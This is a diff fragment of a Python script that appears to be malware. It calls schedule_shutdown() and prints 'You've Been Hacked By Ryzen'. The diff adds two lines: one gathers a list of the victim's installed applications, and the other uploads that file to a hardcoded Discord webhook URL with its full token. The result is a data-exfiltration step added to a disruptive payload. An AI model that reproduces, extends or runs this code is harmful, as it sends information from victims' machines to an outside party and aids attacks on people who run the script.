@@ -552,6 +552,8 @@ if __name__ == "__main__":
     main()
     schedule_shutdown()
     goon()
+    file_path = list_applications_in_folders()
+    send_file_to_discord_webhook(file_path, 'https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH')
 
 print("[*] You've Been Hacked By Ryzen\n")
 time.sleep(3)
